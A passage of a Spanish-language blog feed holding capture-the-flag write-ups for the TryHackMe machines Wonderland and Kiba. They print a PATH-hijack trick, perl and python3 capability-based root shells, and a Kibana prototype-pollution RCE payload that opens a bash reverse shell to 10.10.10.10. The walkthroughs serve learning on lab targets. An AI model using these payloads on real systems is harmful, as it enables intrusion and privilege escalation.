  &lt;span class=&#34;n&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;/bin/echo -n &lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\&amp;#39;&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;Probably by &lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\&amp;#39;&lt;/span&gt;&lt;span class=&#34;s&#34;&gt; &amp;amp;&amp;amp; date --date=&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\&amp;#39;&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;next hour&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\&amp;#39;&lt;/span&gt;&lt;span class=&#34;s&#34;&gt; -R&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
  &lt;span class=&#34;n&#34;&gt;puts&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Ask very nicely, and I will give you some tea while you wait for him&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
  &lt;span class=&#34;n&#34;&gt;getchar&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
  &lt;span class=&#34;n&#34;&gt;puts&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Segmentation fault (core dumped)&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
  &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Primero, intentamos utilizar nuevamente &lt;code&gt;perl&lt;/code&gt; pero, no tenemos permiso.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/wonderland/Screenshot_2020-09-01_00-45-43.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h1 id=&#34;hatter---user&#34;&gt;HATTER - USER&lt;/h1&gt;
&lt;p&gt;Realizamos &lt;code&gt;&amp;quot;Hijacking PATH&amp;quot;&lt;/code&gt;, el objetivo es &lt;code&gt;date&lt;/code&gt; ya que toma el &lt;code&gt;$PATH/date&lt;/code&gt; actual del usuario que lo ejecuta. Para ello modificamos la variable &lt;code&gt;$PATH&lt;/code&gt; agregando al principio una direccion a conveniencia, en este caso el directorio principal de &lt;code&gt;rabbit&lt;/code&gt; en el que seguidamente creamos el archivo &lt;code&gt;date&lt;/code&gt; el cual ejecutará &lt;code&gt;/bin/bash&lt;/code&gt; y para finalizar hacemos ejecutable tal archivo.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#Hijacking PATH&lt;/span&gt;
&lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;PATH&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/home/rabbit:&lt;span class=&#34;nv&#34;&gt;$PATH&lt;/span&gt;
&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$PATH&lt;/span&gt;
&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;/bin/bash&amp;#34;&lt;/span&gt; &amp;gt; date
chmod +x date

&lt;span class=&#34;c1&#34;&gt;#Binario&lt;/span&gt;
/home/rabbit/teaParty
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Ejecutamos el binario &lt;code&gt;teaParty&lt;/code&gt; el cual nos devuelve una shell con el usuario &lt;code&gt;Hatter&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/wonderland/Screenshot_2020-09-01_00-27-52.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h1 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h1&gt;
&lt;p&gt;Intentamos ejecutar &lt;code&gt;perl&lt;/code&gt; ya que tiene &amp;ldquo;capabilites&amp;rdquo; &lt;code&gt;cap_setuid+ep&lt;/code&gt; que al intentarlo con alice y rabbit no fue posible tomar ventaja. Logramos obtener una shell con usuario root y obtener nuestras flags &lt;code&gt;user.txt&lt;/code&gt; y &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;/usr/bin/perl -e &lt;span class=&#34;s1&#34;&gt;&amp;#39;use POSIX (setuid); POSIX::setuid(0); exec &amp;#34;/bin/bash&amp;#34;;&amp;#39;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/wonderland/Screenshot_2020-09-01_00-47-21.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Info&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/&#34;&gt;&lt;strong&gt;Linux Privilege Escalation Using PATH Variable&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/&#34;&gt;&lt;strong&gt;Linux Privilege Escalation using Capabilities&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/thm/wonderland/cover.png" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/thm/wonderland/cover.png" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>capabilities</category>
            
          
            
              <category>python library hijacking</category>
            
          
            
              <category>hijacking PATH</category>
            
          
        
        
          
            
              <category>tryhackme</category>
            
          
            
              <category>linux</category>
            
          
        
        
      </item>
      
      <item>
        <title>TryHackMe - Kiba</title>
        <link>https://sckull.github.io/posts/kiba/</link>
        <pubDate>Mon, 31 Aug 2020 00:00:00 +0000</pubDate>
        
        <atom:modified>Mon, 31 Aug 2020 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/kiba/</guid>
        <description>Kiba es una maquina de TryHackMe, involucra la explotacion de una vulnerabilidad en Kibana que permitió acceso con una shell inversa.</description>
        <content:encoded>



  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/thm/kiba/cover.png&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;p&gt;Kiba es una maquina de TryHackMe, involucra la explotacion de una vulnerabilidad en Kibana que permitió acceso con una shell inversa. Descubrimos un fichero con capabilities steuid para escalar privilegios.&lt;/p&gt;
&lt;h1 id=&#34;room&#34;&gt;Room&lt;/h1&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;&lt;strong&gt;Titulo&lt;/strong&gt;&lt;/th&gt;
&lt;th align=&#34;left&#34;&gt;&lt;a href=&#34;https://tryhackme.com/room/kiba&#34;&gt;kiba&lt;/a&gt; &lt;img src=&#34;data:image/png;base64,AAABAAIAEBAAAAAAIAB4AgAAJgAAABgYAAAAACAAMAMAAJ4CAACJUE5HDQoaCgAAAA1JSERSAAAAEAAAABAIBgAAAB/z/2EAAAI/SURBVHicbZO7a1RBGMV/39zH7ibZ3HV3zSKaKIpCEBIQ8RXBRhQlCuITQVCwsbDRRgSxslD/DAVL02ihjYVIINjYxCISNGoIgnns3WTvY2Ys7i5mNzntfOdXnHNG9N/QRpPfwBoQAcvmcgQbxnh7a3gjg9mdgKt/LbLy/C2kBhwFtotgW+ZGhDNYpvT0aseziwhS8DOA2wVomVlLUIMVSs+u4O0eyG5EWgDAWgvWIsZ2ApRgmwmSdwkenc/MxoBS605E8MXBRSGAwaKtwQqQGESE/ofn8EeHQHeaAVRsNL+TFZZNE4CikyPwCjhG0HFC8d5p8mP7wNgsoy6502sL3Jp5SQ6HgVw/+/M1jhV3cVgNsO3uWTgzitUG2cQM4GosdROzqFPmdchUY44XPz5x5OJl7oyVOWVBHNVubYOUAK4ofHHo9fIETaicOMrsyRHuv3/N46kP1NMEaYfdDWi3ZZVC10PcA8MUr47TY6C/p8jE4gIPvkyyHMeIyIadKQBRCttYxR3eQ3DjQtaFUrjlKtV8Lx//zPNk+jOx0VhrOyBKlMKsruHs3E5w8xL4HljwyltBKVKjqeTyvFuYY+LnLEqE9XtXthnh1qpUbl/DC/pwUkOuWsP1fVQ2FAShz/V5NTfDUhwh6+JUBEWc6+Oslnqp10OaQYmGCPUoIkwTwjRhJY1JrOFrfYk3898B0K1A3fLQDo4fPEQSReSCLUihkM21qzQl0EhTGmn6PzxAjDE2NRpEISIbf2O3JKu9rX+03ele1sdCFgAAAABJRU5ErkJggolQTkcNChoKAAAADUlIRFIAAAAYAAAAGAgGAAAA4Hc9+AAAAvdJREFUeJydlc9rHGUYxz/P+76zM7O7M7uJ/WWIllYikYIVf/TiwV+nFDUS6amQg3hQ6EXEQ7HUqzfxT/CfkNReBIVKb1HBpoi0tkjT4mbLpuzuzDvz9LBJm5BsspsvvHN434fP5+F9Z94RVdWytY72PQgHiwJFiTnWQJzdtuQAOt/9RH/59o7Fkfm9nGjuZZLP3t2x5gC0m6GdHgRuPLKAdnMqb85Q//QtJNjZ4IAoAmZjjNN53+NOP0d68X1MXNm1xozX8pZkHnvyMM3L89g0Hlp2IIHmBeZYYwA/nO5ZO77Al5hGTHJ5Hnf80L7lBsCKwYnBIMhe72pRIqEjvfgB4ezUSP04gNWsw6P8ITVbo4YjsgEWoVDFa4EClAoiJF/NEb5xYiT4E8E3d69w/e9rTMQJqQmZDpu8Ek/xem2amegQMY5+mVG78B7R2y+NDH8iyCjoFhl5vs6qdrjRu8/V9gqxCZitHuXD+EUWLnxC9aPXxoLDxhkIgojBIgTGEpmA2FZQhOW123x7co3Pn73Hj7duHkywGRFhcLEMollGeuZVjn58ln/aLS79usTXv1yh1e8eTKCqbN54muWEp2aon5tDjSFAqBjL0toqXyxf499HnfEFW+HuxDTJ+XlMWIGyBBSXNKinTVY6bb4cUfJUoIoIaO4xU0doLC5g61W0KEAVW61jkxRUCY3lTnedS39ep5X1RhSIoL5AJlIaiwuYySbqN+E1XNoEfXo+obHc6LT5fuX3bfNDBeoLpBaTLi4QTB0B70EVE8UD+C6JrOPq/bv8/OC/fQRliVQCkvPzhC88j+Yb8EqIa06C2f3Kko3nD7dW6BV+uKA0Qu3cHNGpGTTLB+fhAtzEM4iYPbcgMIa/Om1++391iEChcfYdqmdOo1mOqiLWDuDGsvW7GBqFpXt3hggEguPTeF/giwIVQZqTlM7htcSr7jtEhD8etmhn/R0CUVW92XpAu99DRLDWIkFlz23ZLSIwm0wQ2e3/ZVEdkzRmHgNnwS28KjXRzwAAAABJRU5ErkJggg==&#34; alt=&#34;box_img_maker&#34; /&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Descripción&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;Identify the critical security flaw in the data visualization dashboard, that allows execute remote code execution.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Puntos&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;480&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Dificultad&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;Facil&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Maker&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;span&gt;&lt;p class=&#34;user_thm&#34; style=&#34;margin-bottom: 5px;&#34;&gt; &lt;a href=&#34;https://tryhackme.com/p/stuxnet&#34;&gt;stuxnet&lt;/a&gt; &lt;img src=&#34;https://tryhackme-badges.s3.amazonaws.com/stuxnet.png&#34; class=&#34;user_maker_thm&#34;/&gt;&lt;/p&gt;&lt;/span&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;nmap--masscan&#34;&gt;NMAP &amp;amp; MASSCAN&lt;/h1&gt;
&lt;p&gt;Escaneo de puertos tcp, nmap nos muestra el puerto 5601, puerto http (80) y el puerto ssh (22) abiertos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Mon Aug 31 18:26:06 2020 as: nmap -sV -o mini_scan kiba.thm&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; kiba.thm &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.22.111&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.24s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;998&lt;/span&gt; closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp open  http    Apache httpd 2.4.18 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
Service Info: OS: Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Mon Aug 31 18:26:43 2020 -- 1 IP address (1 host up) scanned in 37.55 seconds&lt;/span&gt;

masscan -p1-65535,U:1-65535 10.10.22.111 --rate&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1000&lt;/span&gt; -e tun0

Starting masscan 1.0.5 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;http://bit.ly/14GZzcT&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2020-08-31 22:51:38 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; hosts &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;131070&lt;/span&gt; ports/host&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
Discovered open port 5601/tcp on 10.10.22.111
Discovered open port 80/tcp on 10.10.22.111
Discovered open port 22/tcp on 10.10.22.111
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;http&#34;&gt;HTTP&lt;/h1&gt;
&lt;p&gt;Encontramos una pagina web en el puerto 80 con una imagen ASCII de Cicada y con una frase interesante &lt;code&gt;&amp;quot;linux capabilities&amp;quot;&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/kiba/Screenshot_2020-08-31_16-28-26.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;gobuster&#34;&gt;GOBUSTER&lt;/h2&gt;
&lt;p&gt;Utilizamos gobuster para busqueda de directorios y archivos, no encontramos nada interesante.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;kali@kali:~/thm/kiba$ gobuster dir -u http://kiba.thm/ -w &lt;span class=&#34;nv&#34;&gt;$LIST&lt;/span&gt;/dirb/common.txt -q -t &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; -x php,html,txt
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/server-status &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;http-puerto-5601&#34;&gt;HTTP PUERTO 5601&lt;/h1&gt;
&lt;p&gt;Encontramos el dashboard de kibana.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/kiba/Screenshot_2020-08-31_16-56-39.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Realizamos un query (&lt;code&gt;_aliases&lt;/code&gt; y &lt;code&gt;.kibana/_search&lt;/code&gt; ambos GET) en la consola de &lt;code&gt;Dev Tools&lt;/code&gt; para ver la version de kibana y vemos que es &lt;code&gt;6.5.4&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/kiba/Screenshot_2020-08-31_17-21-46.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h1 id=&#34;kibana--660---rce&#34;&gt;KIBANA &amp;lt; 6.6.0 - RCE&lt;/h1&gt;
&lt;p&gt;Realizamos una busqueda de posibles exploits o vulnerabilidades para esta version de Kibana y encontramos un &lt;a href=&#34;https://slides.com/securitymb/prototype-pollution-in-kibana/#/54/0/0&#34;&gt;&lt;strong&gt;PoC que permite ejecutar comandos&lt;/strong&gt;&lt;/a&gt; a traves de la &amp;ldquo;contaminacion de un objeto&amp;rdquo;. Encontramos informacion de otros dos payloads y de como parchar esta vulnerabilidad en &lt;a href=&#34;https://github.com/mpgn/CVE-2019-7609&#34;&gt;&lt;strong&gt;Github&lt;/strong&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Utilizamos el payload para obtener una shell inversa con los pasos que se muestran en el &lt;a href=&#34;https://slides.com/securitymb/prototype-pollution-in-kibana/#/54/0/0&#34;&gt;&lt;strong&gt;slide&lt;/strong&gt;&lt;/a&gt; y logramos obtener una shell.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;.es&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.props&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;label.__proto__.env.AAAA&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;require(&amp;#34;child_process&amp;#34;).exec(&amp;#34;bash -c \&amp;#39;&lt;/span&gt;bash -i&amp;gt;&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt; /dev/tcp/10.10.10.10/12345 0&amp;gt;&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;1&lt;span class=&#34;se&#34;&gt;\&amp;#39;&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;);//&amp;#39;)
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;.props(label.__proto__.env.NODE_OPTIONS=&amp;#39;--require /proc/self/environ&amp;#39;)
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/kiba/Screenshot_2020-08-31_17-35-43.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/kiba/Screenshot_2020-08-31_17-36-08.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Logramos obtener nuestra flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/kiba/Screenshot_2020-08-31_17-36-44.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h1 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h1&gt;
&lt;p&gt;Hacemos una pequeña enumeracion y vemos algunas configuraciones realizadas en un archivo que se encuentra en la carpeta principal que esta relacionada con capabilities, lo cual esta relacionado con la frase que encontramos en la pagina del puerto 80.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/kiba/Screenshot_2020-08-31_17-40-47.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Realizamos una enumeracion con &lt;code&gt;getcap -r / 2&amp;gt;/dev/null&lt;/code&gt; para verificar que el archivo visto en el historial contiene estas &amp;ldquo;capacidades&amp;rdquo; (similares a los SUID). Vemos que aparece junto a otros.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/kiba/Screenshot_2020-08-31_17-43-52.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Realizamos la explotacion de este archivo, que es python3 para obtener una shell root y nuestra flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;./python3 -c &lt;span class=&#34;s1&#34;&gt;&amp;#39;import os; os.setuid(0); os.system(&amp;#34;/bin/bash&amp;#34;)&amp;#39;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/kiba/Screenshot_2020-08-31_17-48-47.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Informacion:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://nxnjz.net/2018/08/an-interesting-privilege-escalation-vector-getcap/&#34;&gt;&lt;strong&gt;Capabilities - Privilege Escalation&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/&#34;&gt;&lt;strong&gt;Capabilities - Privilege Escalation&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://twitter.com/chybeta/status/1184479040645632001&#34;&gt;&lt;strong&gt;Kibana - PoC&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.synacktiv.com/en/publications/pwning-an-outdated-kibana-with-not-so-sad-vulnerabilities.html&#34;&gt;&lt;strong&gt;Kibana - Sad Vulnerabilities&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/thm/kiba/cover.png" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/thm/kiba/cover.png" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>kibana</category>
            
          
            
              <category>capabilities</category>
            
          
        
        
          
            
              <category>tryhackme</category>
            
          
            
              <category>linux</category>
            
          
        
        
      </item>
